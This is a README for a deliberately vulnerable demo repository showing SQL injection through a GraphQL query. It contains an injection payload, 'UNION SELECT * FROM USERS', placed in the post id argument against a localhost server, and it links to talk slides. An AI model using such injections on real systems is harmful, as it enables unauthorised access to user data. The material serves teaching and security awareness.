# GraphQL SQL injection example

This repository provides a very simple example of SQL injection over GraphQL.

## Install and start

Checkout the code and run:
```
npm install
npm start
```

## Attack
Go on http://localhost:8080/graphql

Run the following query
```graphql
query {
  post(id: "1") {
    id
    title
    content
  }
}
```
This will return an element from the database
To perform an SQL injection that will fetch something from the USERS table, run
```graphql
query {
  post(id: "1 UNION SELECT * FROM USERS") {
    id
    title
    content
  }
}
```

## Slides

https://www.icloud.com/keynote/0VBxVw2J151pVGKCWz9ClH8Fw#GraphQL
